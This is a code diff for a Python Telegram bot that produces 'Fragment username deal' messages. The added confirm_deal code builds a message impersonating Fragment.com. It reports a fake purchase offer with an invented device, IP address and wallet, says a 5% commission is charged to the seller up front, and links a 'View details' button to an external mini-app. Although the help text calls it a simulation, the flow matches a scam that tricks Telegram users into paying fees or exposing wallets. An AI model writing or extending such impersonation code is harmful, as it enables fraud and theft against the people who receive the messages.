@@ -73,190 +73,159 @@ def start_health_server():
             print(f"❌ Impossible de démarrer le serveur de santé: {e2}")
 
 # ===== GESTIONNAIRES TELEGRAM =====
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Gestionnaire de commande /start"""
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Gestionnaire de commande /start - Demande directement le username"""
     user = update.effective_user
     
-    # Bouton pour accéder à la webapp
+    await update.message.reply_text(
+        f"Hello {user.first_name} 👋\n\n"
+        "💎 **Fragment Username Deal**\n\n"
+        "Please send me the **Fragment username** you want to sell.\n\n"
+        "📝 **Format:** Just the name (without @ or .ton)\n"
+        "📝 **Example:** `crypto` or `defi`\n\n"
+        "❌ **Cancel:** /cancel",
+        parse_mode='Markdown'
+    )
+    return USERNAME_INPUT
+
+async def newdeal(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Démarrer un nouveau deal (fonction alternative)"""
     keyboard = [
-        [InlineKeyboardButton("🌐 Ouvrir Fragment Deals", url=WEBAPP_URL)],
-        [InlineKeyboardButton("💎 Créer un nouveau deal", callback_data='start_deal')]
+        [InlineKeyboardButton("🚀 Start Deal", callback_data='start_deal')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    welcome_message = f"""
-🔥 **Fragment Deal Bot** 🔥
+    await update.message.reply_text(
+        "💎 **Fragment Username Deal Bot**\n\n"
+        "Ready to create a deal for a Fragment username?\n\n"
+        "Click the button below to get started! 👇",
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
 
-Salut {user.mention_html()} !
-
-Je t'aide à créer et partager tes deals Fragment de manière anonyme et sécurisée.
-
-**Fonctionnalités :**
-• 💎 Création de deals TON
-• 🔒 Anonymat garanti  
-• ⚡ Partage instantané
-• 🛡️ Transactions sécurisées
-
-**Comment ça marche :**
-1. Clique sur "Créer un nouveau deal"
-2. Renseigne le username et le prix
-3. Partage ton lien sécurisé !
-
-Prêt à commencer ? 🚀
-    """
-    
-    await update.message.reply_html(welcome_message, reply_markup=reply_markup)
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Gestionnaire de commande /help"""
-    help_text = """
-📚 **Aide - Fragment Deal Bot**
-
-**Commandes disponibles :**
-• `/start` - Menu principal
-• `/newdeal` - Créer un nouveau deal
-• `/cancel` - Annuler l'opération en cours
-• `/help` - Afficher cette aide
-
-**Comment créer un deal :**
-1. Utilise `/newdeal` ou le bouton du menu
-2. Entre le username Fragment (sans @)
-3. Entre le prix en TON
-4. Confirme et partage ton lien !
-
-**Sécurité :**
-✅ Aucune donnée personnelle stockée
-✅ Liens temporaires et sécurisés
-✅ Anonymat total garanti
-
-**Support :** Contacte @FragmentDeals pour toute question.
-    """
-    await update.message.reply_html(help_text)
-
-# ===== GESTIONNAIRES DE BOUTONS =====
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Gestionnaire des boutons inline"""
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Gestionnaire des boutons callback"""
     query = update.callback_query
     await query.answer()
     
     if query.data == 'start_deal':
         await query.edit_message_text(
-            "💎 **Nouveau Deal Fragment**\n\n"
-            "Pour commencer, envoie-moi le **username Fragment** que tu veux vendre.\n\n"
-            "📝 **Format :** Juste le nom (sans @ ni .ton)\n"
-            "📝 **Exemple :** `crypto` ou `defi`\n\n"
-            "❌ **Annuler :** /cancel",
+            "💎 **Fragment Username Deal**\n\n"
+            "Please send me the **Fragment username** you want to sell.\n\n"
+            "📝 **Format:** Just the name (without @ or .ton)\n"
+            "📝 **Example:** `crypto` or `defi`\n\n"
+            "❌ **Cancel:** /cancel",
             parse_mode='Markdown'
         )
         return USERNAME_INPUT
     
     return ConversationHandler.END
 
-# ===== CRÉATION DE DEALS =====
-async def newdeal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Commande pour créer un nouveau deal"""
-    await update.message.reply_text(
-        "💎 **Nouveau Deal Fragment**\n\n"
-        "Pour commencer, envoie-moi le **username Fragment** que tu veux vendre.\n\n"
-        "📝 **Format :** Juste le nom (sans @ ni .ton)\n"
-        "📝 **Exemple :** `crypto` ou `defi`\n\n"
-        "❌ **Annuler :** /cancel",
-        parse_mode='Markdown'
-    )
-    return USERNAME_INPUT
-
 async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Récupère le username"""
-    username = update.message.text.strip()
+    """Récupérer le nom d'utilisateur"""
+    username = update.message.text.strip().lower()
     user_id = update.effective_user.id
     
-    # Validation basique du username
-    if len(username) < 1 or len(username) > 50:
+    # Validation simple du nom d'utilisateur
+    if len(username) < 2:
         await update.message.reply_text(
-            "❌ **Username invalide**\n\n"
-            "Le username doit contenir entre 1 et 50 caractères.\n"
-            "Réessaie ou utilise /cancel pour annuler."
+            "❌ **Invalid username**\n\n"
+            "Username must be at least 2 characters long.\n"
+            "Please try again:"
         )
         return USERNAME_INPUT
     
-    # Nettoyage du username
-    username_clean = username.replace('@', '').replace('.ton', '').lower()
+    if not username.replace('_', '').replace('-', '').isalnum():
+        await update.message.reply_text(
+            "❌ **Invalid username**\n\n"
+            "Username can only contain letters, numbers, hyphens and underscores.\n"
+            "Please try again:"
+        )
+        return USERNAME_INPUT
     
-    # Stockage temporaire
-    if user_id not in user_data:
-        user_data[user_id] = {}
-    user_data[user_id]['username'] = username_clean
+    # Stocker les données utilisateur
+    user_data[user_id] = {'username': username}
     
     await update.message.reply_text(
-        f"✅ **Username enregistré :** `{username_clean}`\n\n"
-        "💰 Maintenant, envoie-moi le **prix en TON**.\n\n"
-        "📝 **Format :** Nombre avec ou sans décimales\n"
-        "📝 **Exemples :** `100`, `150.5`, `99.99`\n\n"
-        "❌ **Annuler :** /cancel",
+        f"✅ **Username saved:** `{username}`\n\n"
+        "💰 Now please enter the **price in TON**\n\n"
+        "📝 **Examples:** `1000`, `500.5`, `250`\n"
+        "💎 **Note:** Price should be the total amount in TON",
         parse_mode='Markdown'
     )
+    
     return PRICE_INPUT
 
 async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Récupère le prix"""
-    price_text = update.message.text.strip()
-    user_id = update.effective_user.id
-    
-    # Validation du prix
+    """Récupérer le prix"""
     try:
-        price = float(price_text)
-        if price <= 0 or price > 1000000:
-            raise ValueError("Prix hors limites")
+        price = float(update.message.text.strip())
+        user_id = update.effective_user.id
+        
+        if price <= 0:
+            await update.message.reply_text(
+                "❌ **Invalid price**\n\n"
+                "Price must be greater than 0.\n"
+                "Please enter a valid price in TON:"
+            )
+            return PRICE_INPUT
+        
+        if price > 1000000:  # Limite raisonnable
+            await update.message.reply_text(
+                "❌ **Price too high**\n\n"
+                "Maximum price is 1,000,000 TON.\n"
+                "Please enter a reasonable price:"
+            )
+            return PRICE_INPUT
+        
+        # Mise à jour des données utilisateur
+        if user_id in user_data:
+            user_data[user_id]['price'] = price
+        else:
+            await update.message.reply_text(
+                "❌ **Error:** Username not found.\n"
+                "Please start over with /start"
+            )
+            return ConversationHandler.END
+        
+        # Aperçu du deal
+        username = user_data[user_id]['username']
+        commission = price * 0.05
+        price_usd = price * 3.04  # 1 TON ≈ 3.04 USD
+        commission_usd = commission * 3.04
+        
+        keyboard = [
+            [
+                InlineKeyboardButton("✅ Confirm", callback_data='confirm_yes'),
+                InlineKeyboardButton("❌ Cancel", callback_data='confirm_no')
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            f"📋 **Deal Summary**\n\n"
+            f"👤 **Username:** `{username}`\n"
+            f"💰 **Price:** 💎{price:g} TON (≈${price_usd:.2f})\n"
+            f"💸 **Commission (5%):** 💎{commission:g} TON (≈${commission_usd:.2f})\n"
+            f"💎 **You receive:** 💎{price-commission:g} TON (≈${price_usd-commission_usd:.2f})\n\n"
+            f"⚠️ **Please confirm to proceed**",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        
+        return CONFIRMATION
+        
     except ValueError:
         await update.message.reply_text(
-            "❌ **Prix invalide**\n\n"
-            "Veuillez entrer un nombre valide entre 0 et 1,000,000 TON.\n"
-            "📝 **Exemples :** `100`, `150.5`, `99.99`\n\n"
-            "Réessaie ou utilise /cancel pour annuler."
+            "❌ **Invalid price format**\n\n"
+            "Please enter a valid number.\n"
+            "📝 **Examples:** `1000`, `500.5`, `250`"
         )
         return PRICE_INPUT
-    
-    # Stockage du prix
-    user_data[user_id]['price'] = price
-    
-    # Génération de l'aperçu
-    username = user_data[user_id]['username']
-    deal_url = f"{WEBAPP_URL}/deal/{username}_{price}"
-    
-    # Boutons de confirmation
-    keyboard = [
-        [
-            InlineKeyboardButton("✅ Confirmer", callback_data='confirm_yes'),
-            InlineKeyboardButton("❌ Annuler", callback_data='confirm_no')
-        ],
-        [InlineKeyboardButton("🔄 Recommencer", callback_data='start_deal')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    preview_message = f"""
-🎯 **Aperçu de ton deal**
-
-**Username :** `{username}.ton`
-**Prix :** `{price:g} TON`
-**Lien :** `{deal_url}`
-
-💡 **Ce lien permettra aux acheteurs de :**
-• Voir les détails du username
-• Te contacter de manière anonyme
-• Négocier en sécurité
-
-**Confirmer ce deal ?**
-    """
-    
-    await update.message.reply_text(
-        preview_message,
-        parse_mode='Markdown',
-        reply_markup=reply_markup
-    )
-    return CONFIRMATION
 
 async def confirm_deal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Confirmation finale du deal"""
+    """Confirmer le deal"""
     query = update.callback_query
     await query.answer()
     
@@ -266,34 +235,35 @@ async def confirm_deal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         if user_id in user_data:
             username = user_data[user_id]['username']
             price = user_data[user_id]['price']
-            deal_url = f"{WEBAPP_URL}/deal/{username}_{price}"
             
-            success_message = f"""
-🎉 **Deal créé avec succès !**
-
-**Ton lien de deal :**
-`{deal_url}`
-
-**Partage ce lien pour :**
-✅ Recevoir des offres d'achat
-✅ Négocier en toute sécurité  
-✅ Finaliser la vente
-
-**Conseils :**
-💡 Partage sur les groupes Fragment
-💡 Ajoute des screenshots du username
-💡 Reste disponible pour les questions
-
-**Bonne vente !** 🚀
-            """
+            # Calcul de la commission (5%)
+            commission = price * 0.05
+            price_usd = price * 3.04  # 1 TON ≈ 3.04 USD (approximatif)
+            commission_usd = commission * 3.04
             
-            # Bouton pour créer un autre deal
-            keyboard = [[InlineKeyboardButton("🔄 Créer un autre deal", callback_data='start_deal')]]
+            # Message de simulation Fragment
+            deal_message = f"""We have received a purchase request for your username @{username.upper()}_DEAL via Fragment.com. Below are the transaction details:
+
+• Offer Amount: 💎{price:g} (${price_usd:.2f})
+• Commission: 💎{commission:g} (${commission_usd:.2f})
+
+Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
+
+Additional Information:
+• Device: Safari on macOS  
+• IP Address: 103.56.72.245
+• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U (https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)
+
+Important:
+• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
+• If you choose not to proceed, simply ignore this message."""
+            
+            # Bouton vers la mini-app
+            keyboard = [[InlineKeyboardButton("View details", url=f"https://myminiapp.onrender.com/?user={username}_deal&price={price:g}")]]
             reply_markup = InlineKeyboardMarkup(keyboard)
             
             await query.edit_message_text(
-                success_message,
-                parse_mode='Markdown',
+                deal_message,
                 reply_markup=reply_markup
             )
             
@@ -301,50 +271,64 @@ async def confirm_deal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
             del user_data[user_id]
         else:
             await query.edit_message_text(
-                "❌ **Erreur :** Données de deal introuvables.\n"
-                "Utilise /newdeal pour recommencer."
+                "❌ **Error:** Deal data not found.\n"
+                "Use /start to begin again."
             )
     
     elif query.data == 'confirm_no':
         await query.edit_message_text(
-            "❌ **Deal annulé**\n\n"
-            "Aucun deal n'a été créé.\n"
-            "Utilise /newdeal pour recommencer quand tu veux !"
+            "❌ **Deal cancelled**\n\n"
+            "No worries! Use /start to create a new deal anytime. 👋"
         )
         
-        # Nettoyage des données temporaires
+        # Nettoyage des données
         if user_id in user_data:
             del user_data[user_id]
-    
-    elif query.data == 'start_deal':
-        await query.edit_message_text(
-            "💎 **Nouveau Deal Fragment**\n\n"
-            "Pour commencer, envoie-moi le **username Fragment** que tu veux vendre.\n\n"
-            "📝 **Format :** Juste le nom (sans @ ni .ton)\n"
-            "📝 **Exemple :** `crypto` ou `defi`\n\n"
-            "❌ **Annuler :** /cancel",
-            parse_mode='Markdown'
-        )
-        return USERNAME_INPUT
     
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Annulation de la création de deal"""
+    """Annuler la conversation"""
     user_id = update.effective_user.id
     
-    # Nettoyage des données temporaires
+    # Nettoyage des données
     if user_id in user_data:
         del user_data[user_id]
     
     await update.message.reply_text(
-        "❌ **Opération annulée**\n\n"
-        "Aucun deal n'a été créé.\n"
-        "Utilise /start ou /newdeal quand tu veux recommencer !"
+        "❌ **Operation cancelled**\n\n"
+        "Use /start to create a new deal anytime! 👋",
+        parse_mode='Markdown'
     )
+    
     return ConversationHandler.END
 
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Commande d'aide"""
+    help_text = """
+🤖 **Fragment Deal Bot - Help**
+
+**Available Commands:**
+• `/start` - Create a new Fragment username deal
+• `/help` - Show this help message
+• `/cancel` - Cancel current operation
+
+**How it works:**
+1. 🚀 Use `/start` to begin
+2. 📝 Enter Fragment username  
+3. 💰 Set price in TON
+4. ✅ Confirm the deal
+5. 🔗 Get your deal link
+
+**Support:** This bot helps simulate Fragment.com username deals.
+
+💎 **Ready to start?** Use `/start`
+    """
+    
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
 # ===== FONCTION PRINCIPALE =====
+
 def main():
     """Fonction principale - Mode Polling uniquement"""
     try:
@@ -358,6 +342,7 @@ def main():
         # Gestionnaire de conversation
         conv_handler = ConversationHandler(
             entry_points=[
+                CommandHandler('start', start),
                 CommandHandler('newdeal', newdeal),
                 CallbackQueryHandler(button_callback, pattern='^start_deal$')
             ],
@@ -373,7 +358,6 @@ def main():
         )
         
         # Ajout des gestionnaires
-        application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(conv_handler)
         
